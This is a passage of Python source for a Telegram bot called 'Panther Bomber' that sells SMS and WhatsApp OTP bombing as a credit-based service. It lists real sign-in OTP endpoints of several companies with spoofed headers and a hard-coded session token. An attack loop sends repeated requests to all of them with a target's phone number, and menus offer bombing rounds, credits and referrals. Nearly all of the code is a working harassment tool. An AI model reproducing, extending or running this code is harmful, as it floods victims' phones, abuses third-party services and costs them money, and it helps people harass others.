            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)",
            "Connection": "Keep-Alive", "Accept-Encoding": "gzip",
        },
        "data": lambda p: f"mobile_number={p}",
    },
    {
        "name": "Lenskart",
        "method": "POST",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "headers": {
            "Content-Type": "application/json",
            "X-API-Client": "mobilesite",
            "X-Session-Token": "7836451c-4b02-4a00-bde1-15f7fb50312a",
            "X-Country-Code": "IN", "X-Country-Code-Override": "IN",
            "User-Agent": _UA,
            "Origin": "https://www.lenskart.com",
            "Referer": "https://www.lenskart.com/",
        },
        "data": lambda p: f'{{"captcha":null,"phoneCode":"+91","telephone":"{p}"}}',
    },
    {
        "name": "GoPinkCabs",
        "method": "POST",
        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": _UA,
            "Referer": "https://www.gopinkcabs.com/app/cab/customer/step1.php",
        },
        "data": lambda p: f"check_mobile_number=1&contact={p}",
    },
    {
        "name": "Shemaroome",
        "method": "POST",
        "url": "https://www.shemaroome.com/users/resend_otp",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": _UA,
            "Referer": "https://www.shemaroome.com/users/sign_in",
        },
        "data": lambda p: f"mobile_no=%2B91{p}",
    },
    {
        "name": "Bikefixup",
        "method": "POST",
        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
        "headers": {
            "accept": "application/json",
            "accept-encoding": "gzip", "client": "app",
            "content-type": "application/json; charset=UTF-8",
            "user-agent": "Dart/3.6 (dart:io)",
        },
        "json": lambda p: {"phone": p, "app_signature": "4pFtQJwcz6y"},
    },
    {
        "name": "Rappi-WA",
        "method": "POST",
        "url": "https://services.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "headers": {
            "Deviceid": "5df83c463f0ff8ff",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G965N Build/QP1A.190711.020)",
            "Accept": "application/json",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip, deflate",
        },
        "json": lambda p: {"phone": p, "country_code": "+91"},
    },
    {
        "name": "Rappi-MX-WA",
        "method": "POST",
        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "headers": {
            "Content-Type": "application/json; charset=utf-8",
            "Accept-Encoding": "gzip", "User-Agent": "okhttp/3.9.1",
        },
        "json": lambda p: {"country_code": "+91", "phone": p},
    },
    {
        "name": "Stratzy-SMS",
        "method": "POST",
        "url": "https://stratzy.in/api/web/auth/sendPhoneOTP",
        "headers": {
            "content-type": "application/json",
            "User-Agent": _UA,
            "origin": "https://stratzy.in",
            "referer": "https://stratzy.in/login",
        },
        "json": lambda p: {"phoneNo": p},
    },
    {
        "name": "Stratzy-WA",
        "method": "POST",
        "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
        "headers": {
            "content-type": "application/json",
            "User-Agent": _UA,
            "origin": "https://stratzy.in",
            "referer": "https://stratzy.in/login",
        },
        "json": lambda p: {"phoneNo": p},
    },
    {
        "name": "WellAcademy",
        "method": "POST",
        "url": "https://wellacademy.in/store/api/numberLoginV2",
        "headers": {
            "x-requested-with": "XMLHttpRequest",
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/json; charset=UTF-8",
            "User-Agent": _UA,
            "origin": "https://wellacademy.in",
            "referer": "https://wellacademy.in/store/",
        },
        "json": lambda p: {"contact_no": p},
    },
]

# ==================================================
# ⚡ ATTACK EXECUTION FUNCTION (WITH CREDIT DEDUCTION)
# ==================================================
async def execute_real_attack(update: Update, target_number, count, api_count):
    user_id = update.effective_user.id
    total_hits = count * api_count
    success = 0
    failed = 0
    current_round = 0
    done = 0
    
    # Send "Attack Launched" message
    launched_msg = await update.message.reply_text(
        TXT_ATTACK_LAUNCHED.format(TARGET=target_number, COUNT=count, API_COUNT=api_count, TOTAL=total_hits),
        parse_mode='HTML'
    )
    
    # Loop through all rounds
    for i in range(1, count + 1):
        # ✅ CRITICAL FIX: Check if user left channel IN EVERY ROUND
        if not await is_verified(user_id):
            active_attacks.pop(user_id, None)
            # Show Attack Stopped
            await launched_msg.edit_text(TXT_ATTACK_STOPPED, parse_mode='HTML')
            # Show Channel Left Detected with Rejoin Button
            await update.message.reply_text(
                TXT_LEFT_DETECTED.format(CHANNEL=CHANNEL_USERNAME),
                reply_markup=get_rejoin_buttons(),
                parse_mode='HTML'
            )
            return 0, 0, 0, 0, True  # Stopped
        
        current_round = i
        current_round_success = 0
        current_round_failed = 0
        
        # Hit all APIs for this round
        for api in REAL_APIS:
            try:
                headers = api.get("headers", {})
                
                if api["method"] == "GET":
                    url = api["url"](target_number) if callable(api["url"]) else api["url"]
                    response = requests.get(url, headers=headers, timeout=5)
                elif api["method"] == "POST":
                    url = api["url"]
                    if "json" in api:
                        json_data = api["json"](target_number) if callable(api["json"]) else api["json"]
                        response = requests.post(url, headers=headers, json=json_data, timeout=5)
                    elif "data" in api:
                        data = api["data"](target_number) if callable(api["data"]) else api["data"]
                        response = requests.post(url, headers=headers, data=data, timeout=5)
                
                if response.status_code in [200, 201, 202, 204]:
                    current_round_success += 1
                else:
                    current_round_failed += 1
            except Exception:
                current_round_failed += 1
            
            # Small delay to avoid IP ban
            await asyncio.sleep(0.1)
        
        success += current_round_success
        failed += current_round_failed
        done = i * api_count
        
        percent = int((done / total_hits) * 100)
        if percent > 100: percent = 100
        
        filled = "▰" * (percent // 10)
        empty = "▱" * (10 - (percent // 10))
        bar = filled + empty
        
        try:
            await launched_msg.edit_text(
                TXT_ATTACK_PROGRESS.format(
                    TARGET=target_number,
                    CURRENT_ROUND=current_round,
                    COUNT=count,
                    BAR=bar,
                    PERCENT=percent,
                    SUCCESS=success,
                    FAILED=failed,
                    DONE=done,
                    TOTAL=total_hits,
                    RATE=int((success / done) * 100) if done > 0 else 0
                ),
                parse_mode='HTML'
            )
        except:
            pass
        
        # Delay between rounds
        await asyncio.sleep(1.5)
    
    active_attacks.pop(user_id, None)
    final_rate = int((success / total_hits) * 100) if total_hits > 0 else 0
    
    await launched_msg.edit_text(
        TXT_COMPLETED.format(
            TARGET=target_number,
            SUCCESS=success,
            FAILED=failed,
            TOTAL=total_hits,
            RATE=final_rate
        ),
        parse_mode='HTML'
    )
    
    return success, failed, total_hits, final_rate, False

# ==================================================
# 🤖 HANDLERS
# ==================================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    if user_id not in users_db:
        users_db[user_id] = {
            'credit': 2,  # 🟢 Default 2 Credit Balance
            'total_atk': 0, 'success_atk': 0, 
            'date_joined': datetime.date.today().isoformat(),
            'referrals': 0, 'bonus': 0
        }

    api_count = len(REAL_APIS)

    if user_id == OWNER_ID:
        total_users = len(users_db)
        await update.message.reply_text(
            TXT_ADMIN_PANEL.format(TOTAL_USERS=total_users, CHANNEL=CHANNEL_USERNAME, API_COUNT=api_count),
            reply_markup=get_admin_keyboard(), parse_mode='HTML'
        )
        return

    if not await is_verified(user_id):
        await update.message.reply_text(TXT_VERIFY, reply_markup=get_verify_buttons(), parse_mode='HTML')
        return

    credit = users_db[user_id].get('credit', 0)
    await update.message.reply_text(TXT_VERIFIED, parse_mode='HTML')
    await update.message.reply_text(TXT_MAIN.format(NAME=user.first_name, API_COUNT=api_count, CREDIT=credit), reply_markup=get_main_keyboard(), parse_mode='HTML')

async def verify_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = query.from_user

    if await is_verified(user.id):
        await query.message.delete()
        await query.message.reply_text(TXT_VERIFIED, parse_mode='HTML')
        api_count = len(REAL_APIS)
        credit = users_db[user.id].get('credit', 0)
        await query.message.reply_text(TXT_MAIN.format(NAME=user.first_name, API_COUNT=api_count, CREDIT=credit), reply_markup=get_main_keyboard(), parse_mode='HTML')
    else:
        await query.message.reply_text("❌ Join channel first!", parse_mode='HTML')

async def rejoin_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = query.from_user

    if await is_verified(user.id):
        await query.message.delete()
        await query.message.reply_text(TXT_VERIFIED, parse_mode='HTML')
        api_count = len(REAL_APIS)
        credit = users_db[user.id].get('credit', 0)
        await query.message.reply_text(TXT_MAIN.format(NAME=user.first_name, API_COUNT=api_count, CREDIT=credit), reply_markup=get_main_keyboard(), parse_mode='HTML')
    else:
        await query.message.reply_text("❌ You are still not in the channel. Please rejoin and click Verify.", parse_mode='HTML')

async def bomber_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    if user_id not in users_db:
        users_db[user_id] = {'credit': 2, 'total_atk': 0, 'success_atk': 0, 'date_joined': datetime.date.today().isoformat(), 'referrals': 0, 'bonus': 0}

    if not context.args:
        await update.message.reply_text("❌ Usage: /bomber 9876543210", parse_mode='HTML')
        return
    
    target = context.args[0]
    if not (target.isdigit() and len(target) == 10):
        await update.message.reply_text("❌ Enter a valid 10-digit number without +91 or 0.", parse_mode='HTML')
        return

    context.user_data['target'] = target
    context.user_data['is_group'] = True
    
    api_count = len(REAL_APIS)
    await update.message.reply_text(
        TXT_SELECT_COUNT.format(TARGET=target, API_COUNT=api_count), 
        reply_markup=get_count_reply_keyboard(), 
        parse_mode='HTML'
    )

# ✅ ADMIN COMMAND TO ADD CREDIT
async def add_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only Owner can use this command.", parse_mode='HTML')
        return
    
    if len(context.args) != 2:
        await update.message.reply_text("❌ Usage: /addcredit <user_id> <amount>", parse_mode='HTML')
        return
    
    try:
        target_id = int(context.args[0])
        amount = int(context.args[1])
        
        if target_id not in users_db:
            users_db[target_id] = {'credit': 0, 'total_atk': 0, 'success_atk': 0, 'date_joined': datetime.date.today().isoformat(), 'referrals': 0, 'bonus': 0}
        
        users_db[target_id]['credit'] = users_db[target_id].get('credit', 0) + amount
        await update.message.reply_text(f"✅ Added {amount} credits to User ID {target_id}. New Balance: {users_db[target_id]['credit']}", parse_mode='HTML')
    except:
        await update.message.reply_text("❌ Invalid format. Use: /addcredit 123456789 5", parse_mode='HTML')

async def button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = query.from_user

    if query.data == "verify_check":
        await verify_check(update, context)
    elif query.data == "rejoin_check":
        await rejoin_check(update, context)

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user = update.effective_user
    user_id = user.id
    chat_type = update.message.chat.type
    api_count = len(REAL_APIS)

    # ✅ ENSURE USER IN DB
    if user_id not in users_db:
        users_db[user_id] = {'credit': 2, 'total_atk': 0, 'success_atk': 0, 'date_joined': datetime.date.today().isoformat(), 'referrals': 0, 'bonus': 0}

    # Admin
    if user_id == OWNER_ID and chat_type == 'private':
        if text == "🔙 Back to Main":
            await update.message.reply_text("Main Menu", reply_markup=get_main_keyboard())
            return
        elif text == "📊 Stats":
            total = len(users_db)
            await update.message.reply_text(f"👑 Total Users: {total}\n🌐 Total APIs: {api_count}", parse_mode='HTML')
            return
        elif text == "📢 Broadcast":
            context.user_data['admin_broadcast'] = True
            await update.message.reply_text("Send the message to broadcast to all users:", parse_mode='HTML')
            return
        elif text == "🔁 Change Channel":
            context.user_data['admin_change_channel'] = True
            await update.message.reply_text("Send new Channel Username (e.g., @NewChannel):", parse_mode='HTML')
            return
        elif context.user_data.get('admin_change_channel'):
            global CHANNEL_USERNAME
            CHANNEL_USERNAME = text.strip()
            context.user_data['admin_change_channel'] = False
            await update.message.reply_text(f"✅ Channel updated to {CHANNEL_USERNAME}", parse_mode='HTML')
            return
        elif context.user_data.get('admin_broadcast'):
            msg = text
            count = 0
            for uid in users_db:
                try:
                    await application.bot.send_message(uid, f"📢 **Broadcast:**\n\n{msg}", parse_mode='HTML')
                    count += 1
                    await asyncio.sleep(0.05)
                except:
                    pass
            context.user_data['admin_broadcast'] = False
            await update.message.reply_text(f"✅ Broadcast sent to {count} users!", parse_mode='HTML')
            return

    # Normal User
    if chat_type == 'private':
        # ✅ Check if user left channel (IDLE STATE)
        if not await is_verified(user_id):
            await update.message.reply_text(
                TXT_LEFT_DETECTED.format(CHANNEL=CHANNEL_USERNAME),
                reply_markup=get_rejoin_buttons(),
                parse_mode='HTML'
            )
            return

        if text == "🔙 BACK":
            await update.message.reply_text("🔙 𝗕𝗮𝗰𝗸 𝘁𝗼 𝗺𝗮𝗶𝗻 𝗺𝗲𝗻𝘂", reply_markup=get_main_keyboard())
            return

        elif text == "💣 START BOMB":
            credit = users_db[user_id].get('credit', 0)
            await update.message.reply_text(TXT_NUMBER.format(CREDIT=credit), reply_markup=get_back_keyboard(), parse_mode='HTML')

        elif text == "👤 PROFILE":
            ud = users_db.get(user_id, {})
            await update.message.reply_text(TXT_PROFILE.format(
                NAME=user.first_name, ID=user.id, DATE=ud.get('date_joined', '2026-07-16'),
                TOTAL_ATK=ud.get('total_atk',0), SUCCESS_ATK=ud.get('success_atk',0), 
                SUCCESS_PERC=0,
                CREDIT=ud.get('credit', 0),
                REFERRED=ud.get('referrals',0), BONUS=ud.get('bonus',0), API_COUNT=api_count
            ), parse_mode='HTML')

        elif text == "💎 PREMIUM PLANS":
            await update.message.reply_text(TXT_PREMIUM, parse_mode='HTML')

        elif text == "🔗 REFERRAL":
            ud = users_db.get(user_id, {})
            await update.message.reply_text(TXT_REFERRAL.format(
                BOT_USERNAME=BOT_USERNAME, ID=user.id, REFERRED=ud.get('referrals',0), BONUS=ud.get('bonus',0)
            ), parse_mode='HTML')

        elif text.isdigit() and len(text) == 10:
            context.user_data['target'] = text
            context.user_data['is_group'] = False
            await update.message.reply_text(TXT_SELECT_COUNT.format(TARGET=text, API_COUNT=api_count), reply_markup=get_count_reply_keyboard(), parse_mode='HTML')

        # Handle Count Button Clicks from Reply Keyboard (5, 10, 20, 50)
        elif text in ["5", "10", "20", "50"]:
            target = context.user_data.get('target')
            if not target:
                await update.message.reply_text("❌ Please enter a target number first! Use /bomber NUMBER or click START BOMB.", parse_mode='HTML')
                return
            
            if user_id in active_attacks:
                await update.message.reply_text("⚠️ You already have an active attack running! Please wait for it to finish.", parse_mode='HTML')
                return

            # ✅ CREDIT CHECK START
            current_credit = users_db[user_id].get('credit', 0)
            if current_credit <= 0:
                await update.message.reply_text(TXT_NO_CREDIT, parse_mode='HTML')
                return
            # ✅ CREDIT CHECK END

            count = int(text)
            active_attacks[user_id] = True
            
            # Send Launching message
            await update.message.reply_text(
                TXT_ATTACK_LAUNCH.format(API_COUNT=api_count, COUNT=count, TOTAL=(count*api_count)),
                parse_mode='HTML'
            )
            
            # ✅ DEDUCT CREDIT
            users_db[user_id]['credit'] = current_credit - 1
            
            # Execute Attack with Progress (Includes Leave Detection)
            await execute_real_attack(update, target, count, api_count)

        else:
            await update.message.reply_text("❌ Invalid input. Please send a 10-digit number or use the menu buttons.", parse_mode='HTML')

# ==================================================
# 🚀 START BOT
# ==================================================
if __name__ == "__main__":
    logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
    application = Application.builder().token(TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("bomber", bomber_command))
    application.add_handler(CommandHandler("addcredit", add_credit))  # 🟢 Admin Command
    application.add_handler(CallbackQueryHandler(button_click))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    
    print("🤖 Panther Bomber (Credit Balance + Leave Detection) Running...")
    application.run_polling()